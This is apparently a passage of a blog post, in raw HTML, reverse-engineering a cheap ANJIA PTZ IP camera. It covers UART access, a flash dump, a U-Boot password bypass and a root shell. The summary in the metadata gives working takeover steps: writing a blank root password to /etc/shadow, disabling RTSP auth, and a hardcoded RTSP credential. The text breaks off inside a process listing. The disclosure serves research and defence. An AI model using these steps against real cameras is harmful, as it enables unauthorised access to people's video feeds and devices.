alerts were triggered by built-in features of the camera — not by someone “sitting in a dark room.”\nHowever, given the number of embedded backdoors, the manufacturer could easily enable remote access via the cloud, so this possibility cannot be ruled out. If someone were to crack the shadow file, compromising the camera would become even easier.\nI attempted to contact the vendor, but without success. The camera uses an app called “CareCamPro”, but the app developers told me that the camera manufacturer merely borrowed their application.\nHow we leveraged it (telnet + RTSP) Disable RTSP/ONVIF auth gate\nnoodles runs as root and accepts ; we used it to create /home/dis_onvif_auth, which prevents the RTSP auth initializer from running (seen in apollo RTSP code: load_rtsp_auth is skipped if this file exists). Command: touch /home/dis_onvif_auth. Insert blank root password for telnet\nnoodles can append to /etc/shadow; telnetd reads this file. Command: echo \"root::18622:0:99999:7:::\" \u003e /etc/shadow writes a blank-password root entry. After that, telnet login as root with empty password succeeds. RTSP viewing\nWith auth disabled, RTSP accepts /profile0 on port 8554. Verified stream: mpv \"rtsp://admin:tlJwpbo6@:8554/profile0\" (the admin/tlJwpbo6 pair also appears as a hardcoded URI bypass string in RTSP parser). Scripted workflow (cam-exploit.py)\nSends the two SYSTEM commands above (create /home/dis_onvif_auth, append shadow line). Telnet probe via telnetlib for root/blank on port 23; prints green success on OK. Working RTSP test:\nmpv \"rtsp://admin:tlJwpbo6@192.168.68.78:8554/profile0\" Auth bypass script used at exploit:\ntouch /home/dis_onvif_auth echo \"root::18622:0:99999:7:::\" \u003e /etc/shadow Combine all together in one:\nYour browser does not support the video tag. Short Video of Demo Exploit\n",
+  "wordCount" : "4110",
+  "inLanguage": "en",
+  "datePublished": "2026-01-13T00:00:00Z",
+  "dateModified": "2026-01-13T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Zachary Mitev"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/posts/china-camera-full-teardown/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Messing with Code So You Don’t Have To",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Messing with Code So You Don’t Have To (Alt + H)">Messing with Code So You Don’t Have To</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Reverse Engineering an ANJIA AJ-L73PA1250 PTZ IP Camera
+    </h1>
+    <div class="post-description">
+      A technical reverse-engineering analysis of a low-cost PTZ IP camera, including UART access, firmware extraction, and undocumented backdoors.
+    </div>
+    <div class="post-meta"><span title='2026-01-13 00:00:00 +0000 UTC'>January 13, 2026</span>&nbsp;·&nbsp;<span>20 min</span>&nbsp;·&nbsp;<span>4110 words</span>&nbsp;·&nbsp;<span>Zachary Mitev</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction-and-trigger" aria-label="Introduction and Trigger">Introduction and Trigger</a></li>
+                <li>
+                    <a href="#initial-recon" aria-label="Initial Recon">Initial Recon</a></li>
+                <li>
+                    <a href="#hardware-access" aria-label="Hardware Access">Hardware Access</a></li>
+                <li>
+                    <a href="#raw-uart-console" aria-label="Raw UART Console">Raw UART Console</a></li>
+                <li>
+                    <a href="#firmware-extraction-and-u-boot-bypass" aria-label="Firmware Extraction and U-Boot Bypass">Firmware Extraction and U-Boot Bypass</a></li>
+                <li>
+                    <a href="#runtime-process-and-network-state" aria-label="Runtime Process and Network State">Runtime Process and Network State</a></li>
+                <li>
+                    <a href="#initial-firmware-extraction-and-strings" aria-label="Initial firmware extraction and strings.">Initial firmware extraction and strings.</a></li>
+                <li>
+                    <a href="#firmware-findings-deep-pass" aria-label="Firmware Findings (Deep Pass)">Firmware Findings (Deep Pass)</a></li>
+                <li>
+                    <a href="#boot-flow-config-storage-and-devicecloud-profile" aria-label="Boot Flow, Config Storage, and Device/Cloud Profile">Boot Flow, Config Storage, and Device/Cloud Profile</a></li>
+                <li>
+                    <a href="#mitm-setup-for-camera-traffic" aria-label="MITM Setup for Camera Traffic">MITM Setup for Camera Traffic</a></li>
+                <li>
+                    <a href="#app-and-camera-data-collection-findings" aria-label="App and Camera Data Collection Findings">App and Camera Data Collection Findings</a></li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a></li>
+                <li>
+                    <a href="#how-we-leveraged-it-telnet--rtsp" aria-label="How we leveraged it (telnet &#43; RTSP)">How we leveraged it (telnet + RTSP)</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="introduction-and-trigger">Introduction and Trigger<a hidden class="anchor" aria-hidden="true" href="#introduction-and-trigger">#</a></h2>
+<p>At around 1:30 AM, I received a notification from my home monitoring system indicating that something was scanning my network. The source IP belonged to one of my cheap PTZ cameras.</p>
+<p>The cameras are isolated on a separate network, but I wanted to understand what was happening, so I decided to reverse engineer both the camera and the Android app to find out what was really going on.</p>
+<p>The unit discussed in this write-up is the ANJIA AJ-L73PA1250 PTZ. It’s a low-cost PTZ camera, and I see devices like this installed in many places — small coffee shops, storefronts, and mounted on the outside of buildings.</p>
+<p>But what is the real cost of using a cheap PTZ camera, even one that claims to offer features like person detection?</p>
+<p><img alt="Camera Exterior and Label" loading="lazy" src="/images/camera_exterior_label.png">
+<em>Figure 1: Camera exterior and model label (placeholder).</em></p>
+<h2 id="initial-recon">Initial Recon<a hidden class="anchor" aria-hidden="true" href="#initial-recon">#</a></h2>
+<p>I started with the camera itself since the alert came from it. An nmap scan showed Telnet and RTSP on port 8554 (default RTSP is 554), plus ONVIF ports. Telnet was the most interesting because it exposes the OS directly. I attempted brute force on Telnet and RTSP but without success&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0030s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65528</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE         VERSION
+</span></span><span style="display:flex;"><span>23/tcp    open  telnet
+</span></span><span style="display:flex;"><span>843/tcp   open  unknown
+</span></span><span style="display:flex;"><span>1300/tcp  open  h323hostcallsc?
+</span></span><span style="display:flex;"><span>6688/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>8554/tcp  open  rtsp
+</span></span><span style="display:flex;"><span>8699/tcp  open  arcserve        ARCserve Discovery
+</span></span><span style="display:flex;"><span>16668/tcp open  unknown
+</span></span></code></pre></div><p>So many ports for one tiny camera right?</p>
+<h2 id="hardware-access">Hardware Access<a hidden class="anchor" aria-hidden="true" href="#hardware-access">#</a></h2>
+<p>I tore down the camera and found a small PCB with three suspicious pins at the edge of the board. They measured 3.3V, which usually indicates a UART debugging interface.</p>
+<p><img alt="UART Header on PCB" loading="lazy" src="/images/pcb_uart_header.png">
+<img alt="UART-2 Header on PCB" loading="lazy" src="/images/pcb_uart_connect.png">
+<em>Figure 2 and 3: UART header pins on the main PCB (placeholder).</em></p>
+<h2 id="raw-uart-console">Raw UART Console<a hidden class="anchor" aria-hidden="true" href="#raw-uart-console">#</a></h2>
+<p>Captured with <code>picocom</code> at 112500 baud. I am including the full raw log for reference.</p>
+<details>
+<summary>Show full UART boot log</summary>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>picocom -b 112500 /dev/ttyUSB0
+</span></span><span style="display:flex;"><span>picocom v3.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>port is        : /dev/ttyUSB0
+</span></span><span style="display:flex;"><span>flowcontrol    : none
+</span></span><span style="display:flex;"><span>baudrate is    : 112500
+</span></span><span style="display:flex;"><span>parity is      : none
+</span></span><span style="display:flex;"><span>databits are   : 8
+</span></span><span style="display:flex;"><span>stopbits are   : 1
+</span></span><span style="display:flex;"><span>escape is      : C-a
+</span></span><span style="display:flex;"><span>local echo is  : no
+</span></span><span style="display:flex;"><span>noinit is      : no
+</span></span><span style="display:flex;"><span>noreset is     : no
+</span></span><span style="display:flex;"><span>hangup is      : no
+</span></span><span style="display:flex;"><span>nolock is      : no
+</span></span><span style="display:flex;"><span>send_cmd is    : sz -vv
+</span></span><span style="display:flex;"><span>receive_cmd is : rz -vv -E
+</span></span><span style="display:flex;"><span>imap is        :
+</span></span><span style="display:flex;"><span>omap is        :
+</span></span><span style="display:flex;"><span>emap is        : crcrlf,delbs,
+</span></span><span style="display:flex;"><span>logfile is     : none
+</span></span><span style="display:flex;"><span>initstring     : none
+</span></span><span style="display:flex;"><span>exit_after is  : not set
+</span></span><span style="display:flex;"><span>exit is        : no
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>U-Boot 2010.06-dirty (Aug 30 2022 - 17:53:20)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DRAM:  64 MiB
+</span></span><span style="display:flex;"><span>SF: Got idcode c2 20 17 c2 20
+</span></span><span style="display:flex;"><span>env_pinctrl: &#34;GPIO0,GPIO1,GPIO2,GPIO3,GPIO30,GPIO28,GPIO29,GPIO31,GPIO32,GPIO37,GPIO38,GPIO39,GPIO40,GPIO41,GPIO42,GPIO43,GPIO44&#34;
+</span></span><span style="display:flex;"><span>Net:   FH EMAC
+</span></span><span style="display:flex;"><span>Press &#39;E&#39; to stop autoboot:  0
+</span></span><span style="display:flex;"><span>SF: Got idcode c2 20 17 c2 20
+</span></span><span style="display:flex;"><span>verify flash image OK
+</span></span><span style="display:flex;"><span>load kernel 0x00060000(0x00240000) to 0xa1000000
+</span></span><span style="display:flex;"><span>## Booting kernel from Legacy Image at a1000000 ...
+</span></span><span style="display:flex;"><span>   Image Name:   Linux-4.9.129
+</span></span><span style="display:flex;"><span>   Image Type:   ARM Linux Kernel Image (uncompressed)
+</span></span><span style="display:flex;"><span>   Data Size:    2250928 Bytes = 2.1 MiB
+</span></span><span style="display:flex;"><span>   Load Address: a0008000
+</span></span><span style="display:flex;"><span>   Entry Point:  a0008000
+</span></span><span style="display:flex;"><span>   Verifying Checksum ... OK
+</span></span><span style="display:flex;"><span>   Loading Kernel Image ... OK
+</span></span><span style="display:flex;"><span>OK
+</span></span><span style="display:flex;"><span>prepare atags
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting kernel ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>starting pid 90, tty &#39;&#39;: &#39;/etc/init.d/rcS&#39;
+</span></span><span style="display:flex;"><span>E[RCS]: /etc/init.d/S01udev
+</span></span><span style="display:flex;"><span>Starting udev:      EEE[ OK ]
+</span></span><span style="display:flex;"><span>[RCS]: /etc/init.d/S02init_rootfs
+</span></span><span style="display:flex;"><span>init_rootfs begin
+</span></span><span style="display:flex;"><span>Etarget=release
+</span></span><span style="display:flex;"><span>/bin/mount -t squashfs /dev/mtdblock6 /app
+</span></span><span style="display:flex;"><span>/bin/mount -t jffs2 /dev/mtdblock4 /app/userdata
+</span></span><span style="display:flex;"><span>/bin/mount -t jffs2 /dev/mtdblock5 /app/res
+</span></span><span style="display:flex;"><span>init_rootfs OK
+</span></span><span style="display:flex;"><span>[RCS]: /etc/init.d/S03network
+</span></span><span style="display:flex;"><span>E[RCS]: /etc/init.d/S04app
+</span></span><span style="display:flex;"><span>ECurrent prodid: PQEW4-01
+</span></span><span style="display:flex;"><span>EEE=============================================
+</span></span><span style="display:flex;"><span>Kernel version : Linux 4.9.129
+</span></span><span style="display:flex;"><span>Kernel date    : 2022-08-31 16:03:06
+</span></span><span style="display:flex;"><span>SDK version    : bsp:FH885XV210_IPC_V1.0.0_20210928
+</span></span><span style="display:flex;"><span>sdk:FH885XV200_IPC_V1.1.0_20210716
+</span></span><span style="display:flex;"><span>patch:FH885XV200_IPC_V1.1.0.FP29_20220802
+</span></span><span style="display:flex;"><span>EModel name     : AJ-L73PA1250
+</span></span><span style="display:flex;"><span>FW version     : v220901.1359
+</span></span><span style="display:flex;"><span>Build date     : 2022-09-01T14:02
+</span></span><span style="display:flex;"><span>Chip name      : FH8852V210
+</span></span><span style="display:flex;"><span>=============================================
+</span></span><span style="display:flex;"><span>EFri Jul  1 00:00:00 UTC 2022
+</span></span><span style="display:flex;"><span>Evmm with 24064K
+</span></span><span style="display:flex;"><span>EEEEdev_id=RTL8188FU
+</span></span><span style="display:flex;"><span>EEEEEEEsensor_probe(v3.1): auto probe sensor
+</span></span><span style="display:flex;"><span>gc3003_mipi
+</span></span><span style="display:flex;"><span>EEEEEEEEEEEEopen local socket OK: @jdc_server
+</span></span><span style="display:flex;"><span>open local socket OK: @jsh_server
+</span></span><span style="display:flex;"><span>srv_system[/app/wifi_mode.sh sta start]
+</span></span><span style="display:flex;"><span>exec cmd: &#34;/app/wifi_mode.sh sta start&#34;
+</span></span><span style="display:flex;"><span>EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE[    6.721223] libphy: linkdown . reset phy...
+</span></span><span style="display:flex;"><span>EEEEEEEEEEEENetwork config wlan0
+</span></span><span style="display:flex;"><span>EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEROM:  Use nor flash.
+</span></span><span style="display:flex;"><span>ROM:  Init DDR..Training done.
+</span></span><span style="display:flex;"><span>ROM:  Ok
+</span></span><span style="display:flex;"><span>----------------------------
+</span></span><span style="display:flex;"><span>U-Boot 2010.06-dirty (Aug 30 2022 - 17:53:20)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DRAM:  64 MiB
+</span></span><span style="display:flex;"><span>SF: Got idcode c2 20 17 c2 20
+</span></span><span style="display:flex;"><span>env_pinctrl: &#34;GPIO0,GPIO1,GPIO2,GPIO3,GPIO30,GPIO28,GPIO29,GPIO31,GPIO32,GPIO37,GPIO38,GPIO39,GPIO40,GPIO41,GPIO42,GPIO43,GPIO44&#34;
+</span></span><span style="display:flex;"><span>Net:   FH EMAC
+</span></span><span style="display:flex;"><span>Press &#39;E&#39; to stop autoboot:  00
+</span></span><span style="display:flex;"><span>MMC:   FH_MMC: 0
+</span></span><span style="display:flex;"><span>MMC FLASH INIT: No card on slot0!
+</span></span><span style="display:flex;"><span>### Please input uboot password: ###
+</span></span><span style="display:flex;"><span>*****************************************************************************************************
+</span></span><span style="display:flex;"><span>### Please input uboot password: ###
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>### Please input uboot password: ###
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>### Please input uboot password: ###
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>### Please input uboot password: ###
+</span></span></code></pre></div></details>
+I connected a UART interface to my laptop and was able to access a live serial console. During boot, the camera prompted for a username and password. I tried the most common default credentials, but none of them worked.
+<p>While watching the boot process after powering up the camera, I noticed a message that said: “Press ‘E’ to stop auto boot.”</p>
+<p>Pressing it dropped me into a U-Boot prompt, but it still required a password — one I couldn’t guess. I tried many of the most common U-Boot and IoT passwords, but without success.</p>
+<p>So there had to be another way… right?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>~#picocom -b <span style="color:#ae81ff">112500</span> /dev/ttyUSB0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>U-Boot 2010.06-dirty <span style="color:#f92672">(</span>Aug <span style="color:#ae81ff">30</span> <span style="color:#ae81ff">2022</span> - 17:53:20<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DRAM:  <span style="color:#ae81ff">64</span> MiB
+</span></span><span style="display:flex;"><span>SF: Got idcode c2 <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">17</span> c2 <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>env_pinctrl: <span style="color:#e6db74">&#34;GPIO0,GPIO1,GPIO2,GPIO3,GPIO30,GPIO28,GPIO29,GPIO31,GPIO32,GPIO37,GPIO38,GPIO39,GPIO40,GPIO41,GPIO42,GPIO43,GPIO44&#34;</span>
+</span></span><span style="display:flex;"><span>Net:   FH EMAC
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;E&#39;</span> to stop autoboot:  <span style="color:#ae81ff">00</span>
+</span></span><span style="display:flex;"><span>MMC:   FH_MMC: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>MMC FLASH INIT: No card on slot0!
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### Please input uboot password: ###</span>
+</span></span><span style="display:flex;"><span>******
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### Please input uboot password: ###</span>
+</span></span><span style="display:flex;"><span>********
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### Please input uboot password: ###</span>
+</span></span></code></pre></div><h2 id="firmware-extraction-and-u-boot-bypass">Firmware Extraction and U-Boot Bypass<a hidden class="anchor" aria-hidden="true" href="#firmware-extraction-and-u-boot-bypass">#</a></h2>
+<p>To get a closer look, I extracted firmware from the flash chip. The chip is an MX25L6433F, and I used a CH341A mini programmer with flashrom under Linux. After dumping the flash, I used binwalk to extract the firmware. This was simple part.</p>
+<p><img alt="Firmware Dump" loading="lazy" src="/images/firmware-dump.png"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo flashrom -p ch341a_spi -c <span style="color:#e6db74">&#34;MX25L6406E/MX25L6408E&#34;</span> -r backup.bin
+</span></span></code></pre></div><p>The first files that caught my attention were the shadow file and an environment configuration file containing a <code>ubootpwd</code> string with a SHA-256 hash. I tried cracking it using popular wordlists, as well as mask attacks up to 8 characters, but failed.</p>
+<p>The same thing happened with the shadow hash. I even found other people online asking about this shadow file — with no answers. It was clear the password wasn’t something like <code>admin123</code>, so I set that aside.</p>
+<p><img alt="Firmware Dump-1" loading="lazy" src="/images/firmware-enumeration.png"></p>
+<p><img alt="Firmware Dump-2" loading="lazy" src="/images/firmware-root.png"></p>
+<p>At this point, cracking seemed impossible, so I switched approaches. Instead of cracking the U-Boot password, I broke it. (:</p>
+<p>I used a hex editor to invalidate the password variable by changing <code>ubootpwd</code> to <code>ubooOpwd</code>, then flashed the modified image. That worked, but the camera printed:</p>
+<p>Warning - bad CRC, using default environment</p>
+<p>U-Boot verifies the environment using a CRC32 checksum, and it was now failing, so it loaded the default environment hard-coded into the chip. That was a problem.</p>
+<p>After some searching and experimentation, I recalculated the CRC32 using the chip’s memory configuration and fixed the checksum so the modified environment would load correctly.</p>
+<p><img alt="Edit bin file" loading="lazy" src="/images/hex-edit-u-boot.png"></p>
+<p>Once I got into U-Boot, I immediately pressed &ldquo;E&rdquo; and boom we got the U-boot unlocked. So just used <code>printenv</code> to inspect the environment. To get a shell we need to add <code>rdinit=/bin/sh</code> to the boot args and ran the normal boot command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>setenv bootargs_run set bootargs console<span style="color:#f92672">=</span>ttyS0,115200 mem<span style="color:#f92672">=</span>40M mtdparts<span style="color:#f92672">=</span>spi0.0:64k<span style="color:#f92672">(</span>bootstrap<span style="color:#f92672">)</span>,64k<span style="color:#f92672">(</span>uboot-env<span style="color:#f92672">)</span>,256k<span style="color:#f92672">(</span>uboot<span style="color:#f92672">)</span>,2688k<span style="color:#f92672">(</span>kernel<span style="color:#f92672">)</span>,512k<span style="color:#f92672">(</span>data<span style="color:#f92672">)</span>,-<span style="color:#f92672">(</span>app<span style="color:#f92672">)</span> rdinit<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>run bootcmd
+</span></span></code></pre></div><p>The camera booted and I got a root shell, but because I overwrote the environment it did not fully load user data. So I need to mount userdata manually:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>mkdir -p /app/userdata
+</span></span><span style="display:flex;"><span>mount -t jffs2 /dev/mtdblock4 /app/userdata
+</span></span></code></pre></div><p>There was no shadow file in <code>/app/userdata</code>, only the root filesystem shadow, and it&rsquo;s hash did not match the one from firmware extraction. I cracked that hash and got <code>root123</code>, but Telnet still did not work. I created an empty <code>/app/userdata/shadow</code>, synced, and rebooted:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;root::18622:0:99999:7:::&#39;</span> &gt; /app/userdata/shadow
+</span></span><span style="display:flex;"><span>sync
+</span></span></code></pre></div><p>After reboot, Telnet accepted <code>root</code> with no password. With a live shell, I did deeper analysis. I copied <code>/app/userdata</code> to the SD card and moved it to my PC to continue with IDA analysis and later will do some MITM capture, and Android app inspection.</p>
+<p><img alt="UART Shell" loading="lazy" src="/images/first-uart-shell.png">
+<img alt="Telnet Session" loading="lazy" src="/images/telnet-first-session.png"></p>
+<h2 id="runtime-process-and-network-state">Runtime Process and Network State<a hidden class="anchor" aria-hidden="true" href="#runtime-process-and-network-state">#</a></h2>
+<p>Once Telnet was available, I captured process and network state to understand what was actually running.</p>
+<p>Key observations:</p>
+<ul>
+<li><code>apollo</code> hosts RTSP/ONVIF and the cloud logic; <code>dev_ctrl</code>, <code>noodles</code>, <code>inetd</code>, and <code>telnetd</code> are active alongside it.</li>
+<li>Listening ports include 6688 (ONVIF), 8554 (RTSP), 23 (Telnet), 8699/16668, and 843/1300.</li>
+<li>There is an active outbound TCP link to 34.40.41.193:25515 while the device is online.</li>
+</ul>
+<details>
+<summary>Show process list (ps)</summary>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>[/app]# ps T
+</span></span><span style="display:flex;"><span>  PID USER       VSZ STAT COMMAND
+</span></span><span style="display:flex;"><span>    1 root      1380 S    init
+</span></span><span style="display:flex;"><span>    2 root         0 SW   [kthreadd]
+</span></span><span style="display:flex;"><span>    3 root         0 SW   [ksoftirqd/0]
+</span></span><span style="display:flex;"><span>    4 root         0 SW   [kworker/0:0]
+</span></span><span style="display:flex;"><span>    5 root         0 SW&lt;  [kworker/0:0H]
+</span></span><span style="display:flex;"><span>    6 root         0 SW   [kworker/u2:0]
+</span></span><span style="display:flex;"><span>    7 root         0 SW&lt;  [lru-add-drain]
+</span></span><span style="display:flex;"><span>    8 root         0 SW   [oom_reaper]
+</span></span><span style="display:flex;"><span>    9 root         0 SW&lt;  [writeback]
+</span></span><span style="display:flex;"><span>   10 root         0 SW   [kcompactd0]
+</span></span><span style="display:flex;"><span>   11 root         0 SW&lt;  [crypto]
+</span></span><span style="display:flex;"><span>   12 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   13 root         0 SW&lt;  [kblockd]
+</span></span><span style="display:flex;"><span>   14 root         0 SW&lt;  [cfg80211]
+</span></span><span style="display:flex;"><span>   15 root         0 SW   [kworker/0:1]
+</span></span><span style="display:flex;"><span>   16 root         0 SW&lt;  [rpciod]
+</span></span><span style="display:flex;"><span>   17 root         0 SW&lt;  [xprtiod]
+</span></span><span style="display:flex;"><span>   18 root         0 SW   [kswapd0]
+</span></span><span style="display:flex;"><span>   19 root         0 SW&lt;  [nfsiod]
+</span></span><span style="display:flex;"><span>   33 root         0 SW   [spi0]
+</span></span><span style="display:flex;"><span>   34 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   35 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   36 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   37 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   38 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   39 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   40 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>   41 root         0 SW   [spi1]
+</span></span><span style="display:flex;"><span>   42 root         0 SW   [kworker/u2:1]
+</span></span><span style="display:flex;"><span>   75 root         0 SW&lt;  [fh_aes.0]
+</span></span><span style="display:flex;"><span>   89 root         0 SW&lt;  [ipv6_addrconf]
+</span></span><span style="display:flex;"><span>   90 root         0 SW   [kworker/0:2]
+</span></span><span style="display:flex;"><span>  100 root       752 S &lt;  /sbin/udevd -d
+</span></span><span style="display:flex;"><span>  103 root         0 SW&lt;  [bioset]
+</span></span><span style="display:flex;"><span>  104 root         0 SW   [mmcqd/0]
+</span></span><span style="display:flex;"><span>  218 root         0 SW&lt;  [kworker/0:1H]
+</span></span><span style="display:flex;"><span>  221 root         0 SWN  [jffs2_gcd_mtd4]
+</span></span><span style="display:flex;"><span>  223 root         0 SWN  [jffs2_gcd_mtd5]
+</span></span><span style="display:flex;"><span>  379 root         0 DW   [xbus-rx]
+</span></span><span style="display:flex;"><span>  481 root      1736 S    {main} /app/abin/dev_ctrl
+</span></span><span style="display:flex;"><span>  490 root      1736 S    {ut_jcmd_server_} /app/abin/dev_ctrl
+</span></span><span style="display:flex;"><span>  491 root      1736 S    {ut_jcmd_server_} /app/abin/dev_ctrl
+</span></span><span style="display:flex;"><span>  492 root      1736 S    {ut_dev_event_pr} /app/abin/dev_ctrl
+</span></span><span style="display:flex;"><span>  493 root      1736 S    {net_ctrl_proc} /app/abin/dev_ctrl
+</span></span><span style="display:flex;"><span>  494 root      1736 S    {sd_ctrl_proc} /app/abin/dev_ctrl
+</span></span><span style="display:flex;"><span>  530 root     97564 S    {main} ./apollo
+</span></span><span style="display:flex;"><span>  542 root     97564 S    {onvif_timer} ./apollo
+</span></span><span style="display:flex;"><span>  553 root     97564 S    {fake_rtc_thread} ./apollo
+</span></span><span style="display:flex;"><span>  554 root     97564 S    {ap_alarm_proc} ./apollo
+</span></span><span style="display:flex;"><span>  577 root     97564 S    {get_host_info_t} ./apollo
+</span></span><span style="display:flex;"><span>  588 root     97564 S    {_db_save_thread} ./apollo
+</span></span><span style="display:flex;"><span>  590 root     97564 S    {ntpcli_thread} ./apollo
+</span></span><span style="display:flex;"><span>  591 root     97564 S    {apl_timer_watch} ./apollo
+</span></span><span style="display:flex;"><span>  603 root     97564 S    {video_thread_pr} ./apollo
+</span></span><span style="display:flex;"><span>  604 root     97564 S    {isp_thread_proc} ./apollo
+</span></span><span style="display:flex;"><span>  605 root     97564 S    {service_event_u} ./apollo
+</span></span><span style="display:flex;"><span>  625 root     97564 D    {audio_thread_pr} ./apollo
+</span></span><span style="display:flex;"><span>  628 root     97564 S    {apl_timer_watch} ./apollo
+</span></span><span style="display:flex;"><span>  629 root     97564 S    {_apl_record_sdc} ./apollo
+</span></span><span style="display:flex;"><span>  630 root     97564 S    {snapshot_monito} ./apollo
+</span></span><span style="display:flex;"><span>  631 root     97564 S    {apl_netctrl_thr} ./apollo
+</span></span><span style="display:flex;"><span>  632 root     97564 S    {audio_output_pr} ./apollo
+</span></span><span style="display:flex;"><span>  633 root     97564 S    {audio_player_pr} ./apollo
+</span></span><span style="display:flex;"><span>  634 root     97564 S    {ap_alarm_proc} ./apollo
+</span></span><span style="display:flex;"><span>  635 root     97564 S    {ut_msgq_thread} ./apollo
+</span></span><span style="display:flex;"><span>  639 root     97564 S    {ut_msgq_thread} ./apollo
+</span></span><span style="display:flex;"><span>  640 root     97564 S    {_apl_ptz_timer_} ./apollo
+</span></span><span style="display:flex;"><span>  643 root     97564 S    {service_event_u} ./apollo
+</span></span><span style="display:flex;"><span>  644 root     97564 S    {service_event_u} ./apollo
+</span></span><span style="display:flex;"><span>  645 root     97564 S    {event_thread2_p} ./apollo
+</span></span><span style="display:flex;"><span>  656 root     97564 S    {_apl_ptz_timer_} ./apollo
+</span></span><span style="display:flex;"><span>  657 root     97564 S    {apl_monitor_tim} ./apollo
+</span></span><span style="display:flex;"><span>  658 root     97564 S    {apl_monitor_che} ./apollo
+</span></span><span style="display:flex;"><span>  659 root     97564 S    {apl_monitor_drv} ./apollo
+</span></span><span style="display:flex;"><span>  660 root     97564 S    {ut_jcmd_server_} ./apollo
+</span></span><span style="display:flex;"><span>  661 root     97564 S    {http_rx_thread} ./apollo
+</span></span><span style="display:flex;"><span>  662 root     97564 S    {onvif_timer} ./apollo
+</span></span><span style="display:flex;"><span>  663 root     97564 S    {onvif_discovery} ./apollo
+</span></span><span style="display:flex;"><span>  664 root     97564 S    {rtsp_listen_thr} ./apollo
+</span></span><span style="display:flex;"><span>  665 root     97564 S    {ut_jcmd_server_} ./apollo
